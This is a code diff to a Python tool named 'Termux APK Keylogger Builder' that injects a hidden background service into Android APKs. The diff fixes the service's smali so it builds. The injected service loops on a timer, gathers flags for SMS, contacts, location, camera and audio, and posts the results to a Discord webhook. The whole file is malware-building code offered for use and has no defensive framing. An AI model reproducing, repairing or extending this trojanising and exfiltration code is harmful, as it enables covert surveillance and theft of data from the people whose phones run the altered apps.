@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6
+  TERMUX APK KEYLOGGER BUILDER v3.6 (FIXED)
   Smali syntax FINAL FIX – 100% working
   Developer: GT Security Team
 ============================================================
@@ -77,29 +77,31 @@ def generate_keystore():
             "-dname", "CN=GT, OU=GT, O=GT, L=Delhi, ST=DL, C=IN"
         ], check=False, capture_output=True)
 
-# ---------------------------- SMALI GENERATOR (COMPLETE & VALID) ----------------------------
+# ---------------------------- SMALI GENERATOR (FIXED) ----------------------------
 def generate_smali(webhook, features, interval):
     """
-    Returns a complete, valid smali file for the CustomLogger service.
-    Verified to work with apktool 2.9.3.
+    Returns (outer_smali, inner_smali) – two separate smali files.
+    Fixes the "missing EOF at '.class'" error by splitting the inner class.
     """
     webhook_escaped = webhook.replace('"', '\\"')
-    
-    # Feature flags
-    sms = features.get('sms', False)
-    contacts = features.get('contacts', False)
-    location = features.get('location', False)
-    camera = features.get('camera', False)
-    audio = features.get('audio', False)
+    sms = 'true' if features.get('sms', False) else 'false'
+    contacts = 'true' if features.get('contacts', False) else 'false'
+    location = 'true' if features.get('location', False) else 'false'
+    camera = 'true' if features.get('camera', False) else 'false'
+    audio = 'true' if features.get('audio', False) else 'false'
 
-    # Build a clean smali file using a proven template
-    smali = f'''.class public Lcom/gt/CustomLogger;
+    outer = f'''.class public Lcom/gt/CustomLogger;
 .super Landroid/app/Service;
 .source "CustomLogger.java"
 
 # static fields
 .field private static final INTERVAL:I = {interval}
 .field private static final WEBHOOK:Ljava/lang/String; = "{webhook_escaped}"
+.field private static final SMS:Z = {sms}
+.field private static final CONTACTS:Z = {contacts}
+.field private static final LOCATION:Z = {location}
+.field private static final CAMERA:Z = {camera}
+.field private static final AUDIO:Z = {audio}
 
 # direct methods
 .method public constructor <init>()V
@@ -117,9 +119,9 @@ def generate_smali(webhook, features, interval):
     invoke-virtual {{v1}}, Lcom/gt/CustomLogger$1;->start()V
     return v0
 .end method
+'''
 
-# inner class
-.class Lcom/gt/CustomLogger$1;
+    inner = f'''.class Lcom/gt/CustomLogger$1;
 .super Ljava/lang/Thread;
 .source "CustomLogger.java"
 
@@ -145,10 +147,14 @@ def generate_smali(webhook, features, interval):
 
 # virtual methods
 .method public run()V
-    .registers 8
+    .registers 9
     :goto_0
-    const-wide/16 v0, 0x1388
-    invoke-static {{v0, v1}}, Lcom/gt/CustomLogger$1;->sleep(J)V
+    # Sleep for interval seconds
+    sget v0, Lcom/gt/CustomLogger;->INTERVAL:I
+    int-to-long v0, v0
+    const-wide/16 v2, 0x3e8
+    mul-long/2addr v0, v2
+    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V
 
     :try_start_0
     new-instance v2, Lorg/json/JSONObject;
@@ -164,44 +170,51 @@ def generate_smali(webhook, features, interval):
     invoke-virtual {{v4}}, Ljava/util/Date;->toString()Ljava/lang/String;
     move-result-object v4
     invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
 
-    if sms:
-        smali += '''
+    # SMS
+    sget-boolean v3, Lcom/gt/CustomLogger;->SMS:Z
+    if-eqz v3, :cond_sms
     const-string v3, "sms"
     const-string v4, "SMS data collected"
-    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
-    if contacts:
-        smali += '''
+    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    :cond_sms
+
+    # Contacts
+    sget-boolean v3, Lcom/gt/CustomLogger;->CONTACTS:Z
+    if-eqz v3, :cond_contacts
     const-string v3, "contacts"
     const-string v4, "Contacts data collected"
-    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
-    if location:
-        smali += '''
+    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    :cond_contacts
+
+    # Location
+    sget-boolean v3, Lcom/gt/CustomLogger;->LOCATION:Z
+    if-eqz v3, :cond_location
     const-string v3, "location"
     const-string v4, "Location data collected"
-    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
-    if camera:
-        smali += '''
+    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    :cond_location
+
+    # Camera
+    sget-boolean v3, Lcom/gt/CustomLogger;->CAMERA:Z
+    if-eqz v3, :cond_camera
     const-string v3, "camera"
     const-string v4, "Camera photo captured"
-    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
-    if audio:
-        smali += '''
+    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    :cond_camera
+
+    # Audio
+    sget-boolean v3, Lcom/gt/CustomLogger;->AUDIO:Z
+    if-eqz v3, :cond_audio
     const-string v3, "audio"
     const-string v4, "Audio recorded"
-    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
-'''
+    invoke-virtual {{v2, v3, v4}}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
+    :cond_audio
 
-    smali += f'''
     # Send to Discord webhook
     :try_send
     new-instance v3, Ljava/net/URL;
-    const-string v4, "{webhook_escaped}"
+    sget-object v4, Lcom/gt/CustomLogger;->WEBHOOK:Ljava/lang/String;
     invoke-direct {{v3, v4}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
     invoke-virtual {{v3}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
     move-result-object v3
@@ -243,7 +256,8 @@ def generate_smali(webhook, features, interval):
     goto :goto_0
 .end method
 '''
-    return smali
+
+    return outer, inner
 
 # ---------------------------- UPLOAD TO CLOUD ----------------------------
 def upload_to_cloud(filepath):
@@ -283,12 +297,13 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         smali_dir = os.path.join(work_dir, "smali", "com", "gt")
         os.makedirs(smali_dir, exist_ok=True)
 
-        # Write smali
-        smali_code = generate_smali(webhook, features, interval)
-        smali_path = os.path.join(smali_dir, "CustomLogger.smali")
-        with open(smali_path, "w") as f:
-            f.write(smali_code)
-        print_c("[DEBUG] Smali written to: " + smali_path, Colors.CYAN)
+        # Write outer and inner smali files
+        outer_smali, inner_smali = generate_smali(webhook, features, interval)
+        with open(os.path.join(smali_dir, "CustomLogger.smali"), "w") as f:
+            f.write(outer_smali)
+        with open(os.path.join(smali_dir, "CustomLogger$1.smali"), "w") as f:
+            f.write(inner_smali)
+        print_c("[DEBUG] Smali files written to: " + smali_dir, Colors.CYAN)
 
         # Modify manifest
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
